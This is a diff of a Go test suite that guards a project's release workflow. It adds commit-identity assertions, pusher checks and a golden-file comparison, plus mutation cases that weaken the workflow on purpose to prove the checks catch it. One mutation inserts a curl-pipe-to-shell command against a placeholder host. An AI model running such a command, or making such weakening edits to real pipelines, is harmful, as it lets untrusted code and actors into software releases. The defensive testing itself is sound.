@@ -3,6 +3,8 @@
 package releaseworkflow
 
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -276,7 +278,7 @@ func violations(w workflow, raw string) []string {
 			}
 		}
 	}
-	wantActor := map[string]any{"ACTOR": "${{ github.triggering_actor }}", "OWNER": "${{ github.repository_owner }}"}
+	wantActor := map[string]any{"ACTOR": "${{ github.triggering_actor }}", "PUSHER": "${{ github.actor }}", "OWNER": "${{ github.repository_owner }}"}
 	if s, i := stepNamed(verify, "Require the repository owner"); i >= 0 && (!strings.Contains(s.Run, `test "$ACTOR" = "$OWNER" ||`) || !reflect.DeepEqual(s.Env, wantActor)) {
 		add("verify", "the verify owner check is missing or its ACTOR/OWNER env changed: %v", s.Env)
 	}
@@ -348,6 +350,9 @@ func violations(w workflow, raw string) []string {
 				add("build", "env %s = %v, want %q", k, s.Env[k], want)
 			}
 		}
+		if s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || !strings.Contains(s.Run, `test "$(git rev-parse HEAD)" = "$COMMIT" ||`) {
+			add("build", "the build must assert that the checkout is the verified commit")
+		}
 		if !strings.Contains(s.Run, "GOCACHE=") || !strings.Contains(s.Run, `cmp "$RUNNER_TEMP/bin/smill" "$RUNNER_TEMP/bin/smill-second"`) {
 			add("reproducibility", "the second build with a fresh cache and the cmp are missing")
 		}
@@ -385,6 +390,9 @@ func violations(w workflow, raw string) []string {
 		if strings.HasPrefix(s.Uses, "actions/download-artifact@") && (s.With["name"] != "release-${{ matrix.os }}-${{ matrix.arch }}" || s.With["path"] != "${{ runner.temp }}/dist") {
 			add("artifact", "smoke must download its own target's artifact: %v", s.With)
 		}
+	}
+	if s, i := stepNamed(smoke, "Smoke-test"); i >= 0 && (s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || !strings.Contains(s.Run, `test "$(git rev-parse HEAD)" = "$COMMIT" ||`)) {
+		add("smoke", "the smoke step must assert that the checkout is the verified commit")
 	}
 	if s, i := stepNamed(smoke, "Smoke-test"); i < 0 || !strings.Contains(s.Run, "sh .github/scripts/release-smoke.sh ") || !strings.Contains(s.Run, `release-smoke.sh "$VERSION" "$RUNNER_TEMP/dist/smill_${plain}_${OS}_${ARCH}.tar.gz" "$GITHUB_WORKSPACE"`) {
 		add("archive", "the smoke step must run release-smoke.sh on the archive named smill_<version>_<os>_<arch>.tar.gz")
@@ -426,7 +434,7 @@ func violations(w workflow, raw string) []string {
 		if s.Env["DRAFT"] != "${{ vars.SHEETMILL_RELEASE_DRAFT }}" {
 			add("draft", "the draft switch must be the SHEETMILL_RELEASE_DRAFT variable, got %v", s.Env["DRAFT"])
 		}
-		if s.Env["ACTOR"] != "${{ github.triggering_actor }}" || s.Env["OWNER"] != "${{ github.repository_owner }}" || s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || s.Env["TAG"] != "${{ needs.verify.outputs.version }}" {
+		if s.Env["PUSHER"] != "${{ github.actor }}" || s.Env["ACTOR"] != "${{ github.triggering_actor }}" || s.Env["OWNER"] != "${{ github.repository_owner }}" || s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || s.Env["TAG"] != "${{ needs.verify.outputs.version }}" {
 			add("publish", "publish ACTOR/OWNER/COMMIT/TAG env changed: %v", s.Env)
 		}
 		if s.Env["GH_TOKEN"] != "${{ github.token }}" {
@@ -446,12 +454,87 @@ func violations(w workflow, raw string) []string {
 			add("verify", "verify needs full history to check ancestry")
 		}
 	}
+	if g := goldenDiff(raw); g != "" {
+		add("golden", "%s", g)
+	}
 	sort.Strings(v)
 	return v
 }
 
+// canonical renders the whole workflow (comments dropped) as indented JSON with sorted keys.
+func canonical(raw string) (string, error) {
+	var doc any
+	if err := yaml.Unmarshal([]byte(raw), &doc); err != nil {
+		return "", err
+	}
+	b, err := json.Marshal(normalize(doc))
+	if err != nil {
+		return "", err
+	}
+	var out bytes.Buffer
+	if err := json.Indent(&out, b, "", "  "); err != nil {
+		return "", err
+	}
+	return out.String() + "\n", nil
+}
+
+func normalize(v any) any {
+	switch v := v.(type) {
+	case map[string]any:
+		m := map[string]any{}
+		for k, x := range v {
+			m[k] = normalize(x)
+		}
+		return m
+	case map[any]any:
+		m := map[string]any{}
+		for k, x := range v {
+			m[fmt.Sprint(k)] = normalize(x)
+		}
+		return m
+	case []any:
+		for i := range v {
+			v[i] = normalize(v[i])
+		}
+	}
+	return v
+}
+
+// goldenDiff compares the workflow with testdata/release.golden.json. Every run script,
+// env, with, if and matrix is pinned there, so an edit to any of them is a reviewed change:
+// set UPDATE_RELEASE_GOLDEN=1 and run the tests, then read the diff of the golden file.
+func goldenDiff(raw string) string {
+	got, err := canonical(raw)
+	if err != nil {
+		return "workflow does not parse: " + err.Error()
+	}
+	path := filepath.Join("testdata", "release.golden.json")
+	if os.Getenv("UPDATE_RELEASE_GOLDEN") == "1" && raw == liveRaw {
+		if err := os.WriteFile(path, []byte(got), 0o644); err != nil {
+			return err.Error()
+		}
+	}
+	want, err := os.ReadFile(path)
+	if err != nil {
+		return "golden file missing: " + err.Error()
+	}
+	if got != string(want) {
+		gl, wl := strings.Split(got, "\n"), strings.Split(string(want), "\n")
+		for i := 0; i < len(gl) && i < len(wl); i++ {
+			if gl[i] != wl[i] {
+				return fmt.Sprintf("workflow differs from the golden file at line %d: have %q, golden %q", i+1, gl[i], wl[i])
+			}
+		}
+		return "workflow differs from the golden file in length"
+	}
+	return ""
+}
+
+var liveRaw string
+
 func TestReleaseWorkflowHasNoViolations(t *testing.T) {
 	raw := readFile(t, ".github/workflows/release.yml")
+	liveRaw = raw
 	if v := violations(parse(t, raw), raw); len(v) != 0 {
 		t.Fatalf("release.yml breaks its own rules:\n%s", strings.Join(v, "\n"))
 	}
@@ -530,14 +613,28 @@ func TestWeakeningTheWorkflowIsCaught(t *testing.T) {
 		{"expression in a script", `sh .github/scripts/release-verify.sh version "$REF_NAME"`, `sh .github/scripts/release-verify.sh version "${{ github.ref_name }}"`, "injection", false},
 		{"tool download", "      - run: make test-assets\n", "      - run: make test-assets\n      - run: curl -sSL https://example.test/x | sh\n", "download", false},
 		{"pusher check removed", `test "$ACTOR" = "$OWNER" || { echo "run started`, `true || { echo "run started`, "verify", false},
-		{"owner env always true", "ACTOR: ${{ github.triggering_actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "ACTOR: ${{ github.repository_owner }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "publish", false},
-		{"verify owner env always true", "ACTOR: ${{ github.triggering_actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          test", "ACTOR: ${{ github.repository_owner }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          test", "verify", false},
+		{"owner env always true", "ACTOR: ${{ github.triggering_actor }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "ACTOR: ${{ github.repository_owner }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "publish", false},
+		{"verify owner env always true", "ACTOR: ${{ github.triggering_actor }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          test", "ACTOR: ${{ github.repository_owner }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          test", "verify", false},
 		{"exit 1 became exit 0", `run started by $ACTOR, not by the repository owner $OWNER" >&2; exit 1; }`, `run started by $ACTOR, not by the repository owner $OWNER" >&2; exit 0; }`, "swallow", false},
 		{"set +e", "          # The tag must still name", "          set +e\n          # The tag must still name", "swallow", false},
 		{"echo instead of failing", `test "$n" -ge 1 || { echo`, `test "$n" -ge 1 || echo "x"; { echo`, "swallow", false},
 		{"release-exists accepts any error", `*) echo "cannot tell whether a release exists: $out" >&2; exit 1 ;;`, `*) echo "cannot tell" ;;`, "verify", false},
 		{"head check removed", `          test "$(git rev-parse HEAD)" = "$COMMIT"` + "\n", "", "publish", false},
 		{"publish checks out main", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/download-artifact", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          ref: main\n          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/download-artifact", "publish", false},
+		{"owner check reassigned (F1)", "          test \"$ACTOR\" = \"$OWNER\" || { echo \"run started", "          ACTOR=$OWNER\n          test \"$ACTOR\" = \"$OWNER\" || { echo \"run started", "golden", false},
+		{"publish owner check reassigned (F1)", "          test \"$ACTOR\" = \"$OWNER\" || { echo \"run triggered", "          OWNER=$ACTOR\n          test \"$ACTOR\" = \"$OWNER\" || { echo \"run triggered", "golden", false},
+		{"original pusher check removed (F11)", "\n          test \"$PUSHER\" = \"$OWNER\" || { echo \"run originally started by $PUSHER, not by the repository owner $OWNER\" >&2; exit 1; }\n      - name: Require an annotated tag", "\n      - name: Require an annotated tag", "golden", false},
+		{"check-run count overwritten (F2)", `          test "$n" -ge 1 ||`, "          n=1\n          test \"$n\" -ge 1 ||", "golden", false},
+		{"env on a gate step (F2)", "      - run: make check\n", "      - env:\n          GOFLAGS: -run=^$\n        run: make check\n", "golden", false},
+		{"env on the verify job (F2)", "    timeout-minutes: 15\n    permissions:\n      contents: read\n      actions: read\n", "    timeout-minutes: 15\n    env:\n      GOFLAGS: -run=^$\n    permissions:\n      contents: read\n      actions: read\n", "golden", false},
+		{"build checkout from main (F3)", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          persist-credentials: false\n      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6\n        with:\n          go-version-file: .go-version\n          check-latest: false\n          cache: false", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          ref: main\n          persist-credentials: false\n      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6\n        with:\n          go-version-file: .go-version\n          check-latest: false\n          cache: false", "golden", false},
+		{"smoke downloads from another run (F3)", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          run-id: 1\n          github-token: ${{ github.token }}\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "golden", false},
+		{"build commit check removed (F3)", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          mkdir", "          mkdir", "build", false},
+		{"smoke commit check removed (F3)", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          plain", "          plain", "smoke", false},
+		{"setup-go may float (F5)", "          go-version-file: .go-version\n          check-latest: false\n      - name: Resolve", "          go-version-file: .go-version\n          check-latest: true\n      - name: Resolve", "golden", false},
+		{"command between builds (F6)", "          cmp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"", "          cp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"\n          cmp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"", "golden", false},
+		{"second build shares the cache (F6)", `GOCACHE="$RUNNER_TEMP/gocache-second" go build`, `go build`, "golden", false},
+		{"checksum list unsorted (F9)", "LC_ALL=C sort -k2 > SHA256SUMS", "cat > SHA256SUMS", "golden", false},
 		{"pusher check swallowed", "exit 1; }\n      - name: Require an annotated tag", "exit 1; } || true\n      - name: Require an annotated tag", "swallow", false},
 		{"owner check made conditional", "      - name: Require the repository owner to have started the run\n", "      - name: Require the repository owner to have started the run\n        if: steps.resolve.outputs.dry_run == 'false'\n", "verify", false},
 		{"smoke step conditional", "      - name: Smoke-test the shipped archive natively\n", "      - name: Smoke-test the shipped archive natively\n        if: github.event_name == 'none'\n", "step-if", false},
@@ -568,7 +665,7 @@ func TestWeakeningTheWorkflowIsCaught(t *testing.T) {
 				n = -1
 			}
 			if !strings.Contains(raw, c.old) {
-				t.Fatalf("mutation target not found in release.yml: %q", c.old)
+				t.Fatalf("HARNESS ERROR, NOT A KILL: mutation %q targets text no longer in release.yml: %q", c.name, c.old)
 			}
 			mutated := strings.Replace(raw, c.old, c.new, n)
 			var w workflow
